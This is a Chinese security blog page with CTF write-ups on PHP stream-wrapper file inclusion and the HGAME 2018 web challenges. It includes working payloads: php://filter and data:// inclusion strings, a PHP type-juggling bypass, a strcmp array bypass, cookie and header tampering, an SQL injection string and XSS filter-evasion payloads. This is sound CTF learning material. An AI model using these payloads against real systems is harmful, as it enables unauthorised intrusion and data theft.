<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content><meta name="keywords" content><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>J0k3r</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://unpkg.com"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitment/style/default.min.css"><script src="https://cdn.jsdelivr.net/npm/gitment/dist/gitment.browser.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">29</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="https://bossgirl.github.io/">八千国家奖学金</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://dxxblog.top/">xx_C1</a><a class="author-info-links__name text-center" href="http://www.cooper111.xyz/">花郎世纪</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><nav id="nav" style="background-image: url(https://i.loli.net/2019/03/17/5c8e54b412bc5.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/about/">关于</a></span></div><div id="site-info"><div id="site-title">J0k3r</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/zhuxianjin"><i class="fa-github fa"></i></a><a class="social-icon" href="mailto:xavier.chu@foxmail.com"><i class="fa-envelope fa"></i></a><a class="social-icon" href="http://t.cn/ExVP77H"><i class="fa-qq fa"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=375588920"><i class="fa-music fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2018/04/07/php-wxy/">PHP伪协议</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-04-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/PHP伪协议/">PHP伪协议</a></span><div class="content"><a id="more"></a>
<ul>
<li><p>文件包含函数：</p>
<ul>
<li><p>include、require、include_once、require_once、highlight_file </p>
</li>
<li><p>show_source 、readfile 、file_get_contents 、fopen 、file</p>
</li>
</ul>
</li>
</ul>
<p>题目：<a href="http://chinalover.sinaapp.com/web23/" target="_blank" rel="noopener">file_get_contents</a></p>
<p>从题目file_get_contents就看出来了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
<p>从题目代码来看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--$file = $_GET[&apos;file&apos;];</span><br><span class="line">if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123;</span><br><span class="line">    echo $nctf;</span><br><span class="line">&#125;--&gt;</span><br></pre></td></tr></table></figure>
<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h3><p>php:// 访问各个输入/输出流（I/O streams），如：</p>
<ul>
<li><p>php://filter</p>
</li>
<li><p>php://input</p>
</li>
</ul>
<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>php://filter用于读取源码，php://input用于执行php代码</p>
<p>感觉file://协议应该不行，file:// 用于访问本地文件系统，不受allow_url_fopen与allow_url_include的影响</p>
<p>即<strong>file:// [文件的绝对路径和文件名]</strong></p>
<p>php://filter做过很多，暑假HGAME里的草莓社区-2</p>
<p>这里把当时写的wp贴一下：</p>
<p>通过PHP内置协议直接读取<code>../flag</code>的代码</p>
<p>之前做过类似的题，blog上有记录，直接搬过来改一改</p>
<p><code>php://filter/read=convert.base64-encode/resource=../flag.php</code></p>
<p>同草莓社区-1一样加在<code>show_maopian.php?mao=</code>后面</p>
<p>flag还是在response里，将返回的base64解码即可</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da103ebd21.jpg" alt="15.jpg"></p>
<h4 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议"></a>php://input协议</h4><p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da1276bef2.jpg" alt="5.jpg"></p>
<p>这里应该可以</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da1276a658.jpg" alt="6.jpg"></p>
<p>php://input 可以用来生成一句话</p>
<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h3><p>这个没怎么见过</p>
<p>用法大概就是<code>?file=data://text/plain,&lt;?php phpinfo()?&gt;</code></p>
<p>或<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></p>
<p>//也可以写成：</p>
<p>这里可以用<code>?file=data://text/plain,meizijiu</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da143d8a05.jpg" alt="8.jpg"></p>
<h3 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip://, bzip2://, zlib://协议"></a>zip://, bzip2://, zlib://协议</h3><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，不需要指定后缀名</p>
<p>file.jpg是个zip压缩包，里面有txt的php代码</p>
<p>zip://</p>
<p><code>?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</code>%23是#的url编码</p>
<p>bzip2://</p>
<p><code>?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code></p>
<p>zlib://</p>
<p><code>?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://i.loli.net/2018/07/29/5b5da162c5aed.jpeg" alt="7.jpeg"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/04/02/blfg/">PHP-变量覆盖漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-04-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/变量覆盖/">变量覆盖</a></span><div class="content"><h4 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="$$变量覆盖"></a><code>$$</code>变量覆盖</h4><p>CG-CTF一个简单的<code>$$</code>变量覆盖</p>
<p>地址： <a href="http://chinalover.sinaapp.com/web24/" target="_blank" rel="noopener">变量覆盖</a></p></div><a class="more" href="/2018/04/02/blfg/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/03/02/HGAME_WP/">HGAME(杭电)-2018_WriteUp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><a id="more"></a>
<h4 id="1-Are-you-from-Europe"><a href="#1-Are-you-from-Europe" class="headerlink" title="1. Are you from Europe?"></a>1. Are you from Europe?</h4><p><img src="https://i.loli.net/2018/07/29/5b5da53fa3c24.jpg" alt="8.jpg"></p>
<p>flag肯定不是抽出来的吧</p>
<p>果然view-source发现一行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&quot;&quot;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&apos;&apos;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&apos;\\w+&apos;&#125;;c=1;&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&apos;\\b&apos;+e(c)+&apos;\\b&apos;,&apos;g&apos;),k[c]);return p;&#125;(&apos;w p()&#123;b a=l(&quot;8！k，j 8 o 1 m？&quot;);5(!$(&quot;#4&quot;).7()&amp;&amp;!$(&quot;#9&quot;).7())&#123;2(&quot;i。&quot;);f&#125;b 1=&quot;&quot;;1+=&quot;&quot;;1+=&quot;&quot;;1+=&quot;&quot;;1+=&quot;y&quot;;1+=&quot;&#123;&quot;;1+=&quot;g&quot;;1+=&quot;h&quot;;1+=&quot;3&quot;;1+=&quot;6&quot;;1+=&quot;v&quot;;1+=&quot;h&quot;;1+=&quot;0&quot;;1+=&quot;s&quot;;1+=&quot;e&quot;;1+=&quot;u&quot;;1+=&quot;6&quot;;1+=&quot;0&quot;;1+=&quot;n&quot;;1+=&quot;r&quot;;1+=&quot;!&quot;;1+=&quot;&#125;&quot;;5(a)&#123;$(&quot;#4&quot;).d();$(&quot;#9&quot;).d();2(&quot;t。1: &quot;+1)&#125;q&#123;2(&quot;x。&quot;)&#125;&#125;&apos;,35,35,&apos;|flag|alert||serv5|if|_|html|SSR|craft5|buy|var||remove||return|T||你根本不是欧洲人|你愿意献祭你全部的|欧洲人|confirm|吗||来获取|soHappy|else|E||兑换成功|N|C|function|你失去了唯一的机会|hgame&apos;.split(&apos;|&apos;),0,&#123;&#125;))</span><br></pre></td></tr></table></figure>
<p>肯定是关键，但看不懂，百度知道原来是加密了</p>
<p>花点时间找到了个JS解密的html代码，即</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JS解密<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">   </span></span><br><span class="line"><span class="undefined">    a=62;   </span></span><br><span class="line"><span class="undefined">    function encode() &#123;   </span></span><br><span class="line"><span class="undefined">     var code = document.getElementById('code').value;   </span></span><br><span class="line"><span class="undefined">     code = code.replace(/[ ]+/g, '');   </span></span><br><span class="line"><span class="undefined">     code = code.replace(/'/g, "\'");   </span></span><br><span class="line"><span class="undefined">     var tmp = code.match(/(w+)/g);   </span></span><br><span class="line"><span class="undefined">     tmp.sort();   </span></span><br><span class="line"><span class="undefined">     var dict = [];   </span></span><br><span class="line"><span class="undefined">     var i, t = '';   </span></span><br><span class="line"><span class="undefined">     for(var i=0; i&lt;tmp.length; i++) &#123;   </span></span><br><span class="line"><span class="undefined">     if(tmp[i] != t) dict.push(t = tmp[i]);   </span></span><br><span class="line"><span class="undefined">     &#125;   </span></span><br><span class="line"><span class="undefined">     var len = dict.length;   </span></span><br><span class="line"><span class="undefined">     var ch;   </span></span><br><span class="line"><span class="undefined">     for(i=0; i&lt;len; i++) &#123;   </span></span><br><span class="line"><span class="undefined">     ch = num(i);   </span></span><br><span class="line"><span class="undefined">     code = code.replace(new RegExp('\b'+dict[i]+'\b','g'), ch);   </span></span><br><span class="line"><span class="undefined">     if(ch == dict[i]) dict[i] = '';   </span></span><br><span class="line"><span class="undefined">     &#125;   </span></span><br><span class="line"><span class="xml">     document.getElementById('code').value = "eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c<span class="tag">&lt;<span class="name">a?'':e(parseInt(c</span>/<span class="attr">a</span>)))+((<span class="attr">c</span>=<span class="string">c%a)</span>&gt;</span>35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!''.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return'\\w+'&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p&#125;("   </span></span><br><span class="line"><span class="undefined">     + "'"+code+"',"+a+","+len+",'"+ dict.join('|')+"'.split('|'),0,&#123;&#125;))";   </span></span><br><span class="line"><span class="undefined">    &#125;  </span></span><br><span class="line"><span class="undefined">      </span></span><br><span class="line"><span class="undefined">    function num(c) &#123;   </span></span><br><span class="line"><span class="xml">     return(c<span class="tag">&lt;<span class="name">a?'':num(parseInt(c</span>/<span class="attr">a</span>)))+((<span class="attr">c</span>=<span class="string">c%a)</span>&gt;</span>35?String.fromCharCode(c+29):c.toString(36));   </span></span><br><span class="line"><span class="undefined">    &#125;  </span></span><br><span class="line"><span class="undefined">      </span></span><br><span class="line"><span class="undefined">    function run() &#123;   </span></span><br><span class="line"><span class="undefined">     eval(document.getElementById('code').value);   </span></span><br><span class="line"><span class="undefined">    &#125;  </span></span><br><span class="line"><span class="undefined">      </span></span><br><span class="line"><span class="undefined">    function decode() &#123;   </span></span><br><span class="line"><span class="undefined">     var code = document.getElementById('code').value;   </span></span><br><span class="line"><span class="undefined">     code2 = code.replace(/^eval/, '');   </span></span><br><span class="line"><span class="undefined">     //alert(code);  </span></span><br><span class="line"><span class="undefined">     document.getElementById('code').value = eval(code2);   </span></span><br><span class="line"><span class="undefined">    &#125;   </span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">code</span> <span class="attr">cols</span>=<span class="string">80</span> <span class="attr">rows</span>=<span class="string">20</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>  </span><br><span class="line">      </span><br><span class="line">       </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">onclick</span>=<span class="string">encode()</span> <span class="attr">value</span>=<span class="string">编码</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">onclick</span>=<span class="string">run()</span> <span class="attr">value</span>=<span class="string">执行</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">button</span> <span class="attr">onclick</span>=<span class="string">decode()</span> <span class="attr">value</span>=<span class="string">解码</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我在<a href="http://www.cnblogs.com/dudumao/archive/2012/10/05/2712156.html" target="_blank" rel="noopener"><code>JS eval(function(p,a,c,k,e,r){e=function(c)*****解密 - dudumao - 博客园</code></a>找的</p>
<p>然后运行，把eval代码放进去</p>
<p>注意删掉eval前的空格</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da53f9ffb0.jpg" alt="9.jpg"></p>
<p>这其实就能看到flag了，如果感觉别扭可以去站长工具把混乱的代码格式化</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da53fa20c8.jpg" alt="10.jpg"></p>
<p>把其中形如<code>flag += &quot;&quot;;</code>的连起来就是flag了</p>
<h4 id="2-special-number"><a href="#2-special-number" class="headerlink" title="2. special number"></a>2. special number</h4><p>代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>]))&#123;</span><br><span class="line">        $pattern = <span class="string">'/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ '</span>;</span><br><span class="line">        $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match($pattern,$key)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"格式错误"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $lock=<span class="string">"******************"</span>;</span><br><span class="line">            $b = json_decode($key);</span><br><span class="line">            <span class="keyword">if</span>($b==$lock)</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"this is no special number"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这个题做了好久。。</p>
<p>关键在</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$lock=<span class="string">"******************"</span>;</span><br><span class="line">            $b = json_decode($key);</span><br><span class="line">            <span class="keyword">if</span>($b==$lock)</span><br></pre></td></tr></table></figure>
<p>一直没找到正确的绕过姿势</p>
<p>网上不少<code>$message-&gt;key = $key</code>这样的，和这里不一样</p>
<p>json字符串形如</p>
<p><code>var b=&#39;{&quot;name&quot;:&quot;2323&quot;,&quot;sex&quot;:&quot;afasdf&quot;,&quot;age&quot;:&quot;6262&quot;}&#39;;//json字符串</code></p>
<p>还得利用<code>0==&quot;xxx&quot;</code>这种形式绕过</p>
<p>后来不知在哪看的0e开头的字符串绕过，用<code>key={&quot;key&quot;:0e123}</code>这类的，怎么都不行</p>
<p>直接<code>key=0e123123</code>就行。。。前面正则要求至少7个字母和数字的字符</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da58c4d951.jpg" alt="28.jpg"></p>
<h4 id="3-can-u-find-me"><a href="#3-can-u-find-me" class="headerlink" title="3. can u find me?"></a>3. can u find me?</h4><p>起初，页面只有一行提示：only robot know where is the flag</p>
<p>推测可能有个robot相关的文件，御剑后台扫描</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da5d858fa9.jpg" alt="1.jpg"></p>
<p>robots.txt内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /f1aaaaaaaag.php</span><br></pre></td></tr></table></figure>
<p>进入<code>/f1aaaaaaaag.php</code>，页面显示you are not admin</p>
<p>抓包分析</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da5d85a995.jpg" alt="2.jpg"></p>
<p>把<code>Cookie: user=guest</code>改为<code>Cookie: user=admin</code>就行了</p>
<p>flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da5d822af3.jpg" alt="3.jpg"></p>
<h4 id="4-tell-me-what-you-want"><a href="#4-tell-me-what-you-want" class="headerlink" title="4. tell me what you want"></a>4. tell me what you want</h4><p>这个题就根据提示，一步步修改request就行了</p>
<p>随便输入后提示POST is better，post后提示</p>
<p><code>https://www.wikiwand.com/en/X-Forwarded-For，only localhost can get flag</code></p>
<p>经过一连明显的串提示，最终一共要修改4处</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da5d8578ea.jpg" alt="4.jpg"></p>
<p>得到flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da5d855e33.jpg" alt="5.jpg"></p>
<h3 id="5-我们不一样"><a href="#5-我们不一样" class="headerlink" title="5. 我们不一样"></a>5. 我们不一样</h3><p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'str1'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'str2'</span>]))&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ($_POST[<span class="string">'str1'</span>]!=$_POST[<span class="string">'str2'</span>]&amp;&amp;strcmp($_POST[<span class="string">'str1'</span>],$_POST[<span class="string">'str2'</span>])==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"flag is:"</span>.$flag;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Something wrong.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这是比较简单的了</p>
<p>post的str1和str2不相等，但是strcmp弱类型相等，要利用strcmp漏洞绕过，php版本好像要小于5.3才可以利用</p>
<blockquote>
<p>strcmp是比较两个字符串，如果<code>str1&lt;str2</code> 则返回<code>&lt;0</code> 如果str1大于str2返回<code>&gt;0</code> 如果两者相等 返回0,传入 <code>password[]=xxx</code> 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p>
</blockquote>
<p>所以post：<code>str1=xxx&amp;str2[]=xxx</code>,一个数组一个字符串,得到flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6133f12b.jpg" alt="6.jpg"></p>
<h4 id="白菜2"><a href="#白菜2" class="headerlink" title="白菜2"></a>白菜2</h4><p>有个提示：初识文件结构</p>
<p>是一个图片隐写</p>
<p><a href="http://p1kaloi2x.bkt.clouddn.com/misc2.jpg" target="_blank" rel="noopener">图片地址</a></p>
<p>binwalk一跑，有个flag.txt，在foremost分离就行啦</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da632615ad.jpg" alt="37.jpg"></p>
<p>终端里看不出来flag，把得到的zip包解压就行了</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da63260426.jpg" alt="39.jpg"></p>
<p>flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6325ec40.jpg" alt="38.jpg"></p>
<h3 id="最简单的sql题"><a href="#最简单的sql题" class="headerlink" title="最简单的sql题"></a>最简单的sql题</h3><p>描述</p>
<p>Only admin can get flag!!!!!</p>
<p>admin登陆,password不知道</p>
<p>看下</p>
<p><code>http://118.25.18.223:10015/?username=admin&amp;pwd=xxx&#39;</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da67ab5505.jpg" alt="22.jpg"></p>
<p>然后用最常见的<br><code>?username=admin&amp;pwd=xxx&#39; or &#39;1&#39;=&#39;1</code>即可得到flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5da67ab3c89.jpg" alt="23.jpg"></p>
<h3 id="xss-1"><a href="#xss-1" class="headerlink" title="xss-1"></a>xss-1</h3><p>根据代码，alert(1)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function charge(input) &#123; input = input.replace(/script/gi, &apos;_&apos;); input = input.replace(/image/gi, &apos;_&apos;); input = input.replace(/\(/, &apos;_&apos;); return &apos;&lt;article&gt;&apos; + input + &apos;&lt;/article&gt;&apos;; &#125;</span><br></pre></td></tr></table></figure>
<p>看了下js的正则表达，它会替换script，image，还有（，</p>
<p>可以用img标签</p>
<p>之前做过一个把<code>&lt;&gt;</code>换成<code>\u003\u003e</code>来绕过<code>&lt;&gt;</code>过滤的题</p>
<p>这里类比一下，想把<code>（）</code>换成<code>\u0028\u0029</code></p>
<p>结果不行，就试了试网站上的unicode转码</p>
<p>playload:</p>
<p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert&amp;#40;1&amp;#41;&quot;&gt;</code></p>
<p><img src="https://i.loli.net/2018/07/29/5b5da6bf295f9.jpg" alt="24.jpg"></p>
<p><code>alert(1)</code>整个转成unicode也行</p>
<p><code>&lt;img src=&quot;1&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</code></p>
<p>拿到的flag是<code>hgame</code></p>
<h3 id="xss-2"><a href="#xss-2" class="headerlink" title="xss-2"></a>xss-2</h3><p>这个题增加了过滤，并且在input标签内</p>
<p><code>return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;</code></p>
<p>输入的内容会和<code>&lt;input value=&quot;</code>、<code>&quot; type=&quot;text&quot;&gt;</code>拼接起来</p>
<p>百度input xss注入</p>
<p><a href="https://bbs.ichunqiu.com/thread-11820-1-1.html" target="_blank" rel="noopener">input标签中的xss探索</a></p>
<p><a href="http://blog.csdn.net/change518/article/details/51024706" target="_blank" rel="noopener"> Hidden属性的input标签中XSS的触发方法 </a></p>
<p>感觉跟sql注入有类似的地方</p>
